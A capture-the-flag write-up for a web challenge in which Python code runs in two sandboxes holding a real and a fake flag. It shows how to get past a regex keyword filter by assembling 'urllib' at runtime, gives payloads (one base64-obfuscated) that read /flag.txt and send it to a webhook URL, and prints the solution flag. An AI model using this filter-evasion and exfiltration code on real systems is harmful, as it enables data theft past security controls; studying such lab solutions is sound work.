# Schrödinger's Sandbox

## Challenge
- **URL**: `http://chall.0xfun.org:11102/`
- **Category**: Web (50 pts)
- **Author**: SwitchCaseAdvocate
- **Flag**: `0xfun{schr0d1ng3r_c4t_l34ks_thr0ugh_t1m3}`

## Description
Your code runs in two parallel universes - one with the real flag, one with a fake. You only see the output if both universes agree.

## Analysis

The challenge accepts Python code via `POST /api/submit` (with a PoW nonce). The code runs in **two sandboxed environments**:
- **Universe A**: `/flag.txt` = real flag
- **Universe B**: `/flag.txt` = fake flag

The response includes both execution times (`time_a`, `time_b`) and only shows `stdout` if both universes produce **identical output** (`status: "match"`).

### Banned patterns (regex word boundary `\b...\b`)
- `urllib`, `socket`, `subprocess`, `requests`, `http.client`, `os.system`, `os.popen`

### Not banned
- `os`, `import`, `open`, `exec`, `eval`, `__import__`, `getattr`, `http`

## Vulnerability

The filter uses **regex on source code text** (`\burllib\b`), but doesn't block dynamic string construction. We can bypass the filter by building the module name at runtime.

## Exploit

### Strategy: HTTP exfiltration via `urllib` import bypass

Both universes execute the same code and print the same static output (`"done"`), so outputs match. Meanwhile, the flag is sent to an external webhook. We receive **both flags** and identify the real one by the `0xfun{...}` format.

### Bypass: Dynamic string construction

```python
# \burllib\b won't match because "urllib" never appears as a literal word
x = "url" + chr(108) + "ib"
m = __import__(x + ".re" + "quest", fromlist=["urlopen"])
```

### Final payload

```python
flag = open("/flag.txt").read().strip()
x = "url" + chr(108) + "ib"
m = __import__(x + ".re" + "quest", fromlist=["urlopen"])
m.urlopen("https://webhook.site/YOUR-UUID?flag=" + flag, timeout=3)
print("done")
```

### Alternative: Base64-encoded exec

```python
exec(__import__("base64").b64decode("aW1wb3J0IHVybGxpYi5yZXF1ZXN0..."))
print("done")
```

The base64 payload decodes to:
```python
import urllib.request;urllib.request.urlopen("https://webhook.site/YOUR-UUID?flag="+open("/flag.txt").read().strip(),timeout=3)
```

## Result

Both approaches return `{"status":"match","stdout":"done\n"}`. The webhook receives two requests — one with the real flag, one with the fake:

```
Real: 0xfun{schr0d1ng3r_c4t_l34ks_thr0ugh_t1m3}
Fake: 0xfun{fake_flag_you_cant_see_me}
```

## Flag

```
0xfun{schr0d1ng3r_c4t_l34ks_thr0ugh_t1m3}
```
